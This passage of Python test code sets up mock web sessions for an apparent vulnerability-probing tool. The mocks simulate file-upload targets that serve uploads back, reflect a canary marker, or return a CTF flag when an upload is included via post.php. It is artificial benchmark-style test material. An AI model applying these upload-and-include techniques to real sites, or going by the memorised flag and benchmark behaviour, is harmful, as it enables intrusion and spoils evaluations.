        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        filename = _multipart_filename(data or b"")
        if filename:
            self.stored[filename] = _multipart_file_body(data or b"")
        return self._response(self.absolute(url), "<html>Upload received</html>", method=method)

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        parts = urlsplit(absolute)
        query = parse_qs(parts.query)
        include_ref = query.get("id", [""])[0]
        if parts.path == "/post.php" and include_ref.startswith("uploads/"):
            uploaded_name = include_ref.removeprefix("uploads/") + ".php"
            if uploaded_name in self.stored:
                return self._response(absolute, "flag{generic_php_upload_include}", method="GET")
        if parts.path.startswith("/posts/uploads/"):
            uploaded_name = parts.path.rsplit("/", 1)[-1]
            body = self.stored.get(uploaded_name, b"stored source is not directly executed")
            return self._response(absolute, body.decode("latin-1", errors="ignore"), method="GET")
        return self._response(absolute, "not found", method="GET", status=404)


class _StaticServedUploadSession:
    """
    Stores uploads and serves them back verbatim under /static/images/.

    Models XBEN-022-style behaviour: the upload POST does not leak the marker,
    but the saved file is served as a static asset, so reading it back echoes
    RAVAGE's planted canary. The canary is reachability evidence, not the flag.
    """

    target_url = "http://127.0.0.1/update_profile"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def __init__(self) -> None:
        self.stored: dict[str, bytes] = {}

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        path = urlsplit(absolute).path
        name = path.rsplit("/", 1)[-1]
        if path.startswith("/static/images/") and name in self.stored:
            return self._response(absolute, self.stored[name].decode("latin-1"), method="GET")
        return self._response(absolute, "Not Found", method="GET", status=404)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        filename = _multipart_filename(data or b"")
        if filename:
            self.stored[filename] = _multipart_file_body(data or b"")
        # The upload response renders the profile page; it does not reflect the
        # uploaded filename or the marker, so the only way to observe the canary
        # is to read the served file back.
        return self._response(self.absolute(url), "<html><body>Profile updated.</body></html>", method=method)

    def _response(self, url: str, body: str, *, method: str = "POST", status: int = 200) -> ProbeResponse:
        return ProbeResponse(
            method=method,
            url=url,
            status=status,
            final_url=url,
            elapsed_ms=1,
            headers={"content-type": "text/html"},
            body=body,
        )


class _ReflectedUploadMarkerSession(_StaticServedUploadSession):
    """Upload response reflects the planted canary directly."""

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        file_body = _multipart_file_body(data or b"").decode("latin-1", errors="ignore")
        marker = re.search(r"RAVAGE_UPLOAD_[A-Fa-f0-9]+", file_body)
        body = f"stored upload marker {marker.group(0)}" if marker else "stored upload"
        return self._response(self.absolute(url), body, method=method)


def _multipart_filename(body: bytes) -> str:
    match = re.search(rb'filename="([^"]+)"', body)
    return match.group(1).decode("latin-1") if match else ""


def _multipart_file_body(body: bytes) -> bytes:
    header_end = body.find(b"\r\n\r\n")
    if header_end < 0:
        return b""
    file_and_tail = body[header_end + 4 :]
    return file_and_tail.rsplit(b"\r\n--", 1)[0]
